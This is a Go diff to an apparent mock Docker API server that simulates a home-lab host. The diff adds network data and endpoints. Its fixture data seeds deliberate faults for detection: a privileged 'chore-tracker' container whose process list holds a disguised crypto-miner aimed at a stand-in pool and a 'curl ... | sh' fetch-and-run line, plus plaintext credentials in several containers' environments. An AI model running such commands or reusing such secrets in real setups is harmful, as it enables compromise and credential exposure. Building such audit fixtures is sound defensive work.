@@ -39,6 +39,13 @@ type c struct {
 	Procs                  []string
 	CPU                    float64
 	Service                string
+	Nets                   []string // compose networks; default pi5-lab_default
+}
+
+var networks = []map[string]any{
+	{"Name": "bridge", "Driver": "bridge"}, {"Name": "host", "Driver": "host"}, {"Name": "none", "Driver": "null"},
+	{"Name": "pi5-lab_default", "Driver": "bridge"}, {"Name": "proxy", "Driver": "bridge"},
+	{"Name": "expense_db", "Driver": "bridge", "Internal": true}, {"Name": "monitoring", "Driver": "bridge"},
 }
 
 var now = time.Now()
@@ -49,29 +56,29 @@ var containers = []c{
 	{Name: "vaultwarden", Image: "vaultwarden/server:1.32.0", State: "running", Health: "healthy", User: "1000:1000",
 		Env: []string{"ADMIN_TOKEN_FILE=/run/secrets/admin_token", "SIGNUPS_ALLOWED=false"}, Ports: map[string]string{"80/tcp": "127.0.0.1:8083"},
 		Mounts: [][3]string{{"/srv/vaultwarden", "/data", "rw"}}, Memory: 256 << 20, NanoCpus: 1e9, Pids: 100, ReadOnly: true, NoNewPrivs: true,
-		LogMax: "10m", Restart: "unless-stopped", HealthCmd: []string{"CMD", "/healthcheck.sh"}, Procs: []string{"/vaultwarden"}, CPU: 0.4, Service: "vaultwarden"},
+		LogMax: "10m", Restart: "unless-stopped", HealthCmd: []string{"CMD", "/healthcheck.sh"}, Procs: []string{"/vaultwarden"}, CPU: 0.4, Service: "vaultwarden", Nets: []string{"proxy"}},
 	{Name: "pihole", Image: "pihole/pihole:latest", State: "running", Health: "healthy", NetworkMode: "host", CapAdd: []string{"NET_ADMIN", "SYS_NICE"},
 		Env: []string{"TZ=Asia/Kolkata", "FTLCONF_webserver_api_password=changeme"}, Mounts: [][3]string{{"/srv/pihole/etc", "/etc/pihole", "rw"}},
 		Restart: "unless-stopped", HealthCmd: []string{"CMD-SHELL", "dig +short +norecurse +retry=0 @127.0.0.1 pi.hole || exit 1"}, Procs: []string{"/usr/bin/pihole-FTL -f", "crond -f"}, CPU: 1.2, Service: "pihole"},
 	{Name: "jellyfin", Image: "jellyfin/jellyfin:10.9.11", State: "running", Health: "healthy", Ports: map[string]string{"8096/tcp": "0.0.0.0:8096"},
 		Mounts: [][3]string{{"/srv/jellyfin/config", "/config", "rw"}, {"/mnt/media", "/media", "ro"}}, Devices: []string{"/dev/dri/renderD128"},
-		Memory: 2 << 30, Restart: "unless-stopped", LogMax: "10m", Procs: []string{"/jellyfin/jellyfin --ffmpeg /usr/lib/jellyfin-ffmpeg/ffmpeg"}, CPU: 6.5, Service: "jellyfin"},
+		Memory: 2 << 30, Restart: "unless-stopped", LogMax: "10m", Procs: []string{"/jellyfin/jellyfin --ffmpeg /usr/lib/jellyfin-ffmpeg/ffmpeg"}, CPU: 6.5, Service: "jellyfin", Nets: []string{"proxy"}},
 	{Name: "uptime-kuma", Image: "louislam/uptime-kuma:1", State: "running", Health: "healthy", Ports: map[string]string{"3001/tcp": "127.0.0.1:8084"},
 		Mounts:  [][3]string{{"/srv/uptime-kuma", "/app/data", "rw"}, {"/var/run/docker.sock", "/var/run/docker.sock", "ro"}},
-		Restart: "unless-stopped", HealthCmd: []string{"CMD", "extra/healthcheck"}, Procs: []string{"node server/server.js"}, CPU: 2.1, Service: "uptime-kuma"},
+		Restart: "unless-stopped", HealthCmd: []string{"CMD", "extra/healthcheck"}, Procs: []string{"node server/server.js"}, CPU: 2.1, Service: "uptime-kuma", Nets: []string{"monitoring", "proxy"}},
 	{Name: "ollama", Image: "ollama/ollama:0.3.14", State: "running", Ports: map[string]string{"11434/tcp": "0.0.0.0:11434"},
 		Mounts: [][3]string{{"/srv/ollama", "/root/.ollama", "rw"}}, Restart: "unless-stopped", Procs: []string{"/bin/ollama serve", "/usr/lib/ollama/runners/cpu/ollama_llama_server --model /root/.ollama/models/blobs/sha256-6a0746a1"}, CPU: 312, Service: "ollama"},
 	{Name: "expense-tracker", Image: "ghcr.io/tinyserverlab/expense-tracker:0.4.2", State: "running", Health: "healthy", Ports: map[string]string{"8000/tcp": "0.0.0.0:8085"},
 		Env:    []string{"DATABASE_URL=postgres://expense:Sup3rS3cret!@postgres:5432/expense", "AWS_ACCESS_KEY_ID=AKIAQ3EGTX7LZFDEMO42", "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYDEMOKEY12345", "SESSION_SECRET=8f2a1c9e7d6b5a4f3e2d1c0b9a8f7e6d"},
-		Memory: 256 << 20, Restart: "unless-stopped", HealthCmd: []string{"CMD", "wget", "-qO-", "http://localhost:8000/health"}, Procs: []string{"python -m uvicorn app.main:app --host 0.0.0.0"}, CPU: 0.8, Service: "expense-tracker"},
+		Memory: 256 << 20, Restart: "unless-stopped", HealthCmd: []string{"CMD", "wget", "-qO-", "http://localhost:8000/health"}, Procs: []string{"python -m uvicorn app.main:app --host 0.0.0.0"}, CPU: 0.8, Service: "expense-tracker", Nets: []string{"proxy", "expense_db"}},
 	{Name: "postgres", Image: "postgres:15.4", State: "exited", ExitCode: 137, OOM: true, User: "",
 		Env: []string{"POSTGRES_USER=expense", "POSTGRES_PASSWORD=postgres", "PGDATA=/var/lib/postgresql/data"}, Mounts: [][3]string{{"/srv/postgres", "/var/lib/postgresql/data", "rw"}},
-		Memory: 128 << 20, Restart: "unless-stopped", Service: "postgres"},
+		Memory: 128 << 20, Restart: "unless-stopped", Service: "postgres", Nets: []string{"expense_db"}},
 	{Name: "meal-planner", Image: "ghcr.io/tinyserverlab/meal-planner:latest", State: "restarting", ExitCode: 1, Restarts: 37, Ports: map[string]string{"8000/tcp": "127.0.0.1:8086"},
 		Env: []string{"SECRET_KEY="}, Restart: "always", Service: "meal-planner"},
 	{Name: "speedtest-tracker", Image: "lscr.io/linuxserver/speedtest-tracker:0.20.6", State: "running", Health: "unhealthy", Ports: map[string]string{"80/tcp": "0.0.0.0:8082"},
 		Env: []string{"PUID=1000", "PGID=1000", "APP_KEY=base64:Zm9vYmFyYmF6cXV4cXV1eGZvb2JhcmJhenF1eDEyMzQ="}, Restart: "unless-stopped", HealthCmd: []string{"CMD-SHELL", "curl -fSs http://localhost/api/healthcheck"},
-		Procs: []string{"s6-svscan -t0 /var/run/s6/services", "php-fpm: master process", "nginx: master process"}, CPU: 0.3, Service: "speedtest-tracker"},
+		Procs: []string{"s6-svscan -t0 /var/run/s6/services", "php-fpm: master process", "nginx: master process"}, CPU: 0.3, Service: "speedtest-tracker", Nets: []string{"monitoring"}},
 	{Name: "chore-tracker", Image: "ghcr.io/tinyserverlab/chore-tracker:0.2.0", State: "running", Ports: map[string]string{"8000/tcp": "0.0.0.0:8087"}, Privileged: true,
 		Restart: "unless-stopped", Procs: []string{"node /app/index.js", "/tmp/.x/kdevtmpfsi -o stratum+tcp://pool.minexmr.example:4444 -u 4AdUndXHHZ", "sh -c curl -s http://203.0.113.9/k.sh | sh"}, CPU: 188, Service: "chore-tracker"},
 }
@@ -144,6 +151,8 @@ func handler() http.Handler {
 				"Containers": len(containers), "ContainersRunning": 7, "Images": len(images), "Warnings": []string{}})
 		case p == "/version":
 			j(w, map[string]any{"Version": "27.3.1", "ApiVersion": "1.47"})
+		case p == "/networks":
+			j(w, networks)
 		case p == "/networks/bridge":
 			j(w, map[string]any{"Name": "bridge", "Options": map[string]string{"com.docker.network.bridge.enable_icc": "true"}})
 		case p == "/containers/json":
@@ -295,6 +304,17 @@ func inspect(x c) map[string]any {
 	if nm == "" {
 		nm = "pi5-lab_default"
 	}
+	nets := map[string]any{}
+	switch {
+	case nm == "host":
+		nets["host"] = map[string]string{}
+	case len(x.Nets) > 0:
+		for i, n := range x.Nets {
+			nets[n] = map[string]string{"IPAddress": fmt.Sprintf("172.%d.0.%d", 18+i, 2+len(x.Name)%200)}
+		}
+	default:
+		nets[nm] = map[string]string{"IPAddress": "172.18.0." + fmt.Sprint(2+len(x.Name)%200)}
+	}
 	return map[string]any{
 		"Id": x.ID, "Name": "/" + x.Name, "Image": imgID(x.Image), "RestartCount": x.Restarts, "State": st,
 		"Config": map[string]any{"User": x.User, "Env": x.Env, "Image": x.Image, "Healthcheck": hc,
@@ -303,7 +323,8 @@ func inspect(x c) map[string]any {
 		"HostConfig": map[string]any{"Privileged": x.Privileged, "CapAdd": x.CapAdd, "NetworkMode": nm, "ReadonlyRootfs": x.ReadOnly,
 			"Memory": x.Memory, "NanoCpus": x.NanoCpus, "PidsLimit": pids, "SecurityOpt": sec, "Devices": devs, "PortBindings": pb,
 			"RestartPolicy": map[string]any{"Name": x.Restart}, "LogConfig": map[string]any{"Type": "json-file", "Config": logCfg}},
-		"Mounts": mounts,
+		"Mounts":          mounts,
+		"NetworkSettings": map[string]any{"Networks": nets},
 	}
 }
 
